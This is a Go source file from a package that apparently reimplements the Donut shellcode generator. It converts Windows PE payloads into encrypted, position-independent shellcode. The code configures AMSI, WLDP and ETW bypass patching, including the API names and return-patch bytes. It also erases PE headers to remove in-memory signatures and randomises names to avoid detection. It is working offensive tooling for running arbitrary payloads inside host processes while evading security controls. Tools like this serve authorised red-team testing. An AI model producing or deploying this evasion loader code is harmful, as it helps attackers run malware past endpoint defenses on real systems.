package donut

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
)

// Config describes one shellcode generation request. The zero value is not
// usable; start from DefaultConfig and adjust.
//
// Everything the generator needs is a field here. There are no file names, no
// output paths and no format selectors: payload bytes go in, shellcode bytes come
// out, and what you do with them is yours to decide.
type Config struct {
	// Payload is the module to embed: a native PE image, in memory, from any
	// source. It is never modified and never retained; the returned shellcode
	// holds its own copy. Required.
	Payload []byte

	// ModuleType asserts what Payload is. Zero, the usual case, lets the package
	// read it from the PE headers, where the distinction is unambiguous. When set
	// it must be ModuleDLL or ModuleEXE, and it is still checked against the
	// headers rather than blindly trusted.
	ModuleType int

	// Arch is the target architecture: ArchX86, ArchX64, or ArchX84 for both.
	// Dual mode carries both loader stubs and is roughly 11 KB bigger, so pick one
	// architecture when the target is known.
	Arch int

	// Entropy controls name randomisation and instance encryption. EntropyDefault
	// is the right choice for anything that leaves the machine.
	Entropy int

	// Bypass selects the AMSI/WLDP/ETW policy. The patching itself lives in the
	// loader stubs; this sets what the loader is told to attempt, and whether a
	// failure is fatal. See README.md for the WLDP caveat.
	Bypass int

	// Headers chooses between zeroing the mapped image's PE headers (the default,
	// and what removes the MZ/PE signature from memory) and keeping them.
	Headers int

	// ExitOpt is what happens once the module returns: ExitThread returns cleanly
	// after erasing the instance, ExitProcess terminates the host process.
	ExitOpt int

	// Thread runs an unmanaged EXE's entry point on a new thread and redirects
	// exit-related APIs to RtlExitUserThread, so a payload that calls exit() does
	// not take the host down with it. Set it to 1 to enable.
	Thread int

	// ArgsWide passes Args to a DLL export as UTF-16 instead of ANSI. Match it to
	// the export's parameter type: wchar_t* needs this, char* must not have it.
	// The conversion goes through the system ANSI code page, not UTF-8.
	ArgsWide bool

	// Method names the DLL export to call after its DllMain. Empty, the default,
	// means "initialise the DLL and stop there". It is verified against the export
	// table, case sensitively, so a typo fails at Build rather than on the target.
	// A name longer than MaxNameLen is refused (ErrMethodNameTooLong): the loader
	// resolves the export by the stored name, which would otherwise be truncated.
	// EXE modules ignore it, as donut does.
	Method string

	// Args is the parameter string delivered to the module: the single pointer a
	// DLL export receives, or the command line an EXE sees. Only the first
	// MaxArgsLen bytes are stored, matching donut; TruncatedFields reports when
	// that would lose text.
	Args string

	// Compress selects the payload compression engine: CompressNone (the
	// default, also the zero value) embeds the payload verbatim;
	// CompressLZNT1 uses a portable Go encoder; CompressXpress uses Windows
	// compression APIs. The loader expands either stream with RtlDecompressBuffer.
	// The module header retains both original and compressed lengths. LZNT1 and
	// aPLib use portable encoders; XPRESS uses ntdll on Windows only.
	Compress int

	// Strict refuses to generate shellcode for payloads the hand-mapping loader
	// is known not to handle correctly, instead of producing bytes that misbehave
	// on the target. The refusal list is exactly CompatIssues' blocker level;
	// degraded-but-running cases stay warnings and are only reported by Compat.
	// Off by default, so nothing changes for existing callers.
	Strict bool

	// Rand supplies random bytes. Nil means crypto/rand. Tests override it to make
	// encrypted output reproducible.
	Rand func([]byte) error

	// KeyMaterial pins the entropy material instead of drawing it from Rand, so
	// encrypted shellcode can be reproduced exactly. Production callers leave it
	// nil.
	KeyMaterial *KeyMaterial
}

// KeyMaterial is the random material donut stores in a DONUT_INSTANCE. The counter
// half of Key and ModKey advances during encryption.
type KeyMaterial struct {
	Key    [cryptSize]byte
	ModKey [cryptSize]byte
	Sig    [maxName]byte // Eight nonzero signature bytes followed by a NUL.
	IV     uint64
}

// DefaultConfig returns a configuration for payload with this package's defaults:
// dual architecture, no compression, full entropy (random names plus encryption),
// AMSI/WLDP/ETW bypass that continues on failure, headers overwritten, the enhanced
// loader stubs (README.md), and exit the thread when the module
// returns.
func DefaultConfig(payload []byte) Config {
	return Config{
		Payload: payload,
		Arch:    ArchX84,
		Entropy: EntropyDefault,
		Bypass:  BypassContinue,
		Headers: HeadersOverwrite,
		ExitOpt: ExitThread,
	}
}

func (c *Config) fillRandom(b []byte) error {
	if c.Rand != nil {
		return c.Rand(b)
	}
	if _, err := rand.Read(b); err != nil {
		return fmt.Errorf("%w: %v", ErrRandom, err)
	}
	return nil
}

// Build generates position independent shellcode for the configured module.
//
// The encoded prologue, instance and module format follow Donut; the embedded
// enhanced loader differs from upstream. Development regression tests are not
// included in this distribution. Managed images and scripts are refused.
func Build(cfg Config) ([]byte, error) {
	if len(cfg.Payload) == 0 {
		return nil, ErrEmptyInput
	}
	if cfg.Entropy == 0 {
		cfg.Entropy = EntropyDefault
	}
	if cfg.Bypass == 0 {
		cfg.Bypass = BypassNone
	}
	if cfg.Headers == 0 {
		cfg.Headers = HeadersOverwrite
	}
	if cfg.ExitOpt == 0 {
		cfg.ExitOpt = ExitThread
	}
	if cfg.Arch == 0 {
		cfg.Arch = ArchX84
	}
	if cfg.Compress == 0 {
		cfg.Compress = CompressNone
	}
	if err := cfg.validate(); err != nil {
		return nil, err
	}

	// 1. Identify the module. This also rejects anything this package does not
	// generate, so every step below can assume a native image.
	info, err := inspect(cfg.Payload, cfg.ModuleType)
	if err != nil {
		return nil, err
	}
	if cfg.Strict {
		issues, err := Compat(cfg.Payload)
		if err != nil {
			return nil, err
		}
		if blockers := issues.Blockers(); len(blockers) > 0 {
			return nil, fmt.Errorf("%w: %v", ErrIncompatiblePayload, blockers)
		}
	}
	if err := cfg.checkArch(info); err != nil {
		return nil, err
	}

	// 2. A named DLL export must exist. donut resolves it at load time by walking
	// the export table and matching the name exactly; checking here turns a typo
	// into a build error instead of a crash on the target.
	if info.Type == ModuleDLL && cfg.Method != "" {
		// The stored name is cut to the field width, but the loader resolves the
		// export by that stored name. A name longer than the field would pass the
		// export check below yet be truncated on the way in, so the loader would
		// look up a name the image does not export. Refuse it here instead.
		if len(cfg.Method) > MaxNameLen {
			return nil, fmt.Errorf("%w: %d bytes, limit %d", ErrMethodNameTooLong, len(cfg.Method), MaxNameLen)
		}
		pe, err := parsePE(cfg.Payload)
		if err != nil {
			return nil, err
		}
		if !hasExport(cfg.Payload, pe, cfg.Method) {
			return nil, ErrDLLFunction
		}
		// A forwarder (an export whose RVA points at a "DLL.Func" string) is now
		// resolved by the loader through its target module at run time, so it is
		// no longer refused here. If the target is not loaded in the host the
		// loader aborts the load; Compat reports the forwarder as informational.
	}
	// A DLL's parameters are delivered as its export's single argument, so a
	// parameter string with no export to receive it is a caller mistake.
	if info.Type == ModuleDLL && len(cfg.Args) > 0 && cfg.Method == "" {
		return nil, ErrDLLParam
	}

	// 3. Build the module.
	mod, err := buildModule(&cfg, info)
	if err != nil {
		return nil, err
	}

	// 4. Build the instance.
	inst, err := buildInstance(&cfg, mod)
	if err != nil {
		return nil, err
	}

	// 5. Assemble the shellcode.
	pic, err := buildPic(cfg.Arch, inst)
	if err != nil {
		return nil, err
	}

	// 6. Encrypt in place when entropy is at the default level.
	if cfg.Entropy == EntropyDefault {
		body := pic[picPrologueLen+instOffAPICnt : picPrologueLen+InstanceSize+len(inst.ModuleBlob)]
		donutEncrypt(inst.Key[:16], inst.Key[16:32], body)
	}

	return pic, nil
}

func (c *Config) validate() error {
	switch c.Arch {
	case ArchX86, ArchX64, ArchX84:
	default:
		return ErrInvalidArch
	}
	switch c.Entropy {
	case EntropyNone, EntropyRandom, EntropyDefault:
	default:
		return ErrInvalidEntropy
	}
	switch c.Bypass {
	case BypassNone, BypassAbort, BypassContinue:
	default:
		return ErrInvalidBypass
	}
	switch c.Headers {
	case HeadersOverwrite, HeadersKeep:
	default:
		return ErrInvalidHeaders
	}
	// donut also defines exit option 3, "block forever instead of cleaning up".
	// That branch sits before the loader's erase-and-free step, so its only
	// observable effect is to leave the instance in memory unscrubbed. It is not
	// accepted here.
	switch c.ExitOpt {
	case ExitThread, ExitProcess:
	default:
		return ErrInvalidExit
	}
	switch c.ModuleType {
	case 0, ModuleDLL, ModuleEXE:
	default:
		return fmt.Errorf("%w: module type %d is not generated by this package", ErrInvalidType, c.ModuleType)
	}
	switch c.Compress {
	case CompressNone, CompressLZNT1, CompressAPLib, CompressXpress:
	default:
		return fmt.Errorf("%w: engine %d", ErrCompression, c.Compress)
	}
	return nil
}

// TruncatedFields reports the configuration fields whose values exceed the width
// donut gives them, and which Build therefore cuts to fit. Names match the Config
// fields; an empty result means nothing will be lost.
//
//	cfg.Args = veryLongString
//	if lost := cfg.TruncatedFields(); len(lost) > 0 {
//		log.Printf("these values will be truncated: %v", lost)
//	}
//
// The limits are donut's, not this package's; see MaxNameLen and MaxArgsLen.
func (c *Config) TruncatedFields() []string {
	// An unmanaged EXE reserves five bytes of its parameter field for the
	// command-line placeholder, so the same text has to fit a shorter field.
	prefix := ""
	if c.isEXEGuess() {
		prefix = "AAAA "
	}
	var out []string
	for _, f := range []struct {
		name  string
		value string
		limit int
	}{
		{"Method", c.Method, MaxNameLen},
		{"Args", prefix + c.Args, MaxArgsLen + len(prefix)},
	} {
		if len(f.value) > f.limit {
			out = append(out, f.name)
		}
	}
	return out
}

// isEXEGuess reports whether TruncatedFields should assume an EXE module. It
// honours an explicit Config.ModuleType and otherwise parses the payload, so the
// helper is usable before a build. A payload it cannot read is treated as "not an
// EXE", which is the conservative choice because it reports more loss, not less.
func (c *Config) isEXEGuess() bool {
	if c.ModuleType != 0 {
		return c.ModuleType == ModuleEXE
	}
	info, err := Inspect(c.Payload)
	return err == nil && info.Type == ModuleEXE
}

// checkArch rejects a shellcode target that cannot host the module. An x86 image
// needs an x86 loader and vice versa; dual mode carries both stubs, so it can host
// either.
func (c *Config) checkArch(info Info) error {
	if (c.Arch == ArchX86 && info.Arch == ArchX64) || (c.Arch == ArchX64 && info.Arch == ArchX86) {
		return ErrArchMismatch
	}
	return nil
}

// buildModule fills in DONUT_MODULE and appends the payload.
//
// The rules reproduce donut's create_module() for native images: a method only for
// a DLL that names an export, and a parameter string for every type, cut to
// donut's width, with the five byte command-line placeholder prefixed only for an
// EXE.
//
// The managed fields (runtime, domain, cls) are never written, because managed
// images are refused - but they stay in DONUT_MODULE at their original offsets.
// The loader stubs were compiled against that layout, so those bytes must still be
// present, just zero. instance.go documents the same rule.
func buildModule(cfg *Config, info Info) (*module, error) {
	mod := &module{
		Type:   info.Type,
		Thread: cfg.Thread,
		// Compression defaults to none: the payload is embedded verbatim. With
		// an engine set, the data region below carries the compressed stream and
		// ZLen its size, while Len keeps the original length — donut's exact
		// wire behaviour (create_module/compress_file).
		Compress: CompressNone,
		Unicode:  boolToInt(cfg.ArgsWide),
		Len:      uint32(len(cfg.Payload)),
		Data:     cfg.Payload,
	}

	if cfg.Compress != CompressNone {
		zdata, err := compressPayload(cfg.Compress, cfg.Payload)
		if err != nil {
			return nil, err
		}
		mod.Compress = cfg.Compress
		mod.ZLen = uint32(len(zdata))
		mod.Data = zdata
	}

	// With no compressor the payload is embedded verbatim and ZLen stays 0, which
	// is what donut leaves it as when compress_file() never runs.
	if mod.Type == ModuleDLL && cfg.Method != "" {
		mod.Method = truncateTo(cfg.Method, maxName-1)
	}

	if cfg.Args != "" {
		// An unmanaged EXE gets a placeholder the loader later rewrites in place,
		// so it can locate and patch the command line inside the mapped image.
		prefix := ""
		if mod.Type == ModuleEXE {
			placeholder := "AAAA"
			if cfg.Entropy != EntropyNone {
				// An error here must not degrade into a different prefix:
				// the bytes would still be emitted, just not the ones
				// requested.
				p, err := randomName(cfg, 4)
				if err != nil {
					return nil, err
				}
				placeholder = p
			}
			prefix = placeholder + " "
		}
		mod.Args = prefix + truncateTo(cfg.Args, argsMaxLen)
	}

	return mod, nil
}

// truncateTo keeps the leading n bytes of s, matching the strncpy and strncat
// truncation donut applies.
func truncateTo(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n]
}

func boolToInt(b bool) int {
	if b {
		return 1
	}
	return 0
}

// buildInstance fills in DONUT_INSTANCE and appends the module blob.
func buildInstance(cfg *Config, mod *module) (*instance, error) {
	inst := newInstance()
	inst.Module = *mod
	inst.ExitOpt = cfg.ExitOpt
	// DONUT_INSTANCE.oep stays zero. donut uses it to select its fork path, which
	// is broken upstream: the thread it creates for the payload never receives the
	// instance, so it faults before the payload runs. Leaving the field zero keeps
	// the loader on the synchronous path, and the field stays in the instance so
	// the layout is unchanged.
	inst.OEP = 0
	inst.Entropy = cfg.Entropy
	inst.Bypass = cfg.Bypass
	inst.Headers = cfg.Headers
	inst.Type = InstanceEmbed

	if cfg.Entropy == EntropyDefault {
		if km := cfg.KeyMaterial; km != nil {
			// Checked rather than repaired: a caller pinning key material is
			// reproducing a build, and quietly changing their bytes would
			// defeat that. The same no-zero rule applies as below.
			for i := 0; i < sigLen; i++ {
				if km.Sig[i] == 0 {
					return nil, fmt.Errorf(
						"%w: Sig must be %d non-zero bytes: the loader hashes it as a string, so byte %d must not be zero",
						ErrInvalidKeyMaterial, sigLen, i)
				}
			}
			if km.Sig[sigLen] != 0 {
				return nil, fmt.Errorf("%w: Sig must be NUL-terminated after %d bytes", ErrInvalidKeyMaterial, sigLen)
			}
			inst.Key = km.Key
			inst.ModKey = km.ModKey
			inst.Sig = km.Sig
			inst.IV = km.IV
		} else {
			if err := cfg.fillRandom(inst.Key[:]); err != nil {
				return nil, err
			}
			if err := cfg.fillRandom(inst.ModKey[:]); err != nil {
				return nil, err
			}
			// The signature must come from donut's unambiguous alphabet, not raw
			// bytes: the loader hashes it as a NUL-terminated C string, so a zero
			// byte silently shortens what it hashes, the MAC check then fails on
			// the target, and the loader aborts with no diagnostic. Measured at
			// about one EntropyDefault build in thirty with raw bytes.
			sig, err := randomName(cfg, sigLen)
			if err != nil {
				return nil, err
			}
			copy(inst.Sig[:sigLen], sig)
			iv := make([]byte, 8)
			if err := cfg.fillRandom(iv); err != nil {
				return nil, err
			}
			inst.IV = binary.LittleEndian.Uint64(iv)
		}

		// The signature is a random string from donut's unambiguous alphabet, and
		// the MAC is MARU(signature, iv). The loader recomputes it to confirm
		// decryption worked before it trusts anything else.
		inst.Mac = Maru(string(inst.Sig[:sigLen]), inst.IV)
		inst.Module.Mac = inst.Mac
	}

	// Strings the loader needs to disable AMSI, WLDP and ETW are present only when
	// bypassing is requested, which is also what the loader keys off. The CLR name
	// belongs to that group: the AMSI routine locates amsi through it.
	if cfg.Bypass != BypassNone {
		inst.Clr = "clr"
		inst.Amsi = "amsi"
		inst.AmsiInit = "AmsiInitialize"
		inst.AmsiScanB = "AmsiScanBuffer"
		inst.AmsiScanS = "AmsiScanString"
		inst.Wldp = "wldp"
		inst.WldpQuery = "WldpQueryDynamicCodeTrust"
		inst.WldpIsApr = "WldpIsClassInApprovedList"
		inst.Ntdll = "ntdll"
		inst.EtwWrite = "EtwEventWrite"
		inst.EtwUnreg = "EtwEventUnregister"
		inst.EtwRet64 = "\xc3"
		inst.EtwRet32 = "\xc2\x14\x00\x00"
	}

	// Command-line rewriting, EXE only. DataName and Kernelbase name the section
	// and the DLL whose export the loader patches to reach the CRT command-line
	// symbols, which CmdSyms lists.
	if mod.Type == ModuleEXE {
		if cfg.Args != "" {
			inst.DataName = ".data"
			inst.Kernelbase = "kernelbase"
			inst.CmdSyms = cmdSyms
		}
		if cfg.Thread != 0 {
			inst.ExitAPI = exitAPI
		}
	}

	// The module blob follows the fixed instance. Its key (mod_key) is only
	// consumed by the staging path, which this package does not generate, but
	// donut always fills the field in so the layout matches; the module region is
	// covered by the instance encryption pass in Build rather than here.
	blob := mod.marshal()
	inst.ModuleBlob = blob
	inst.ModLen = uint64(len(blob))

	return inst, nil
}

// randomName produces a random name from donut's unambiguous alphabet. It
// draws DONUT_MAX_NAME random bytes and maps each onto the 16 unambiguous
// characters, matching gen_random_string() so name material is comparable
// with donut's.
//
// The alphabet matters beyond style: these names live in NUL-terminated
// fields, so a value drawn from the whole byte range can be read as shorter
// than it is.
func randomName(cfg *Config, n int) (string, error) {
	const alphabet = "HMN34P67R9TWCXYF"
	buf := make([]byte, maxName)
	if err := cfg.fillRandom(buf); err != nil {
		return "", err
	}
	out := make([]byte, n)
	for i := 0; i < n; i++ {
		out[i] = alphabet[int(buf[i])%len(alphabet)]
	}
	return string(out), nil
}
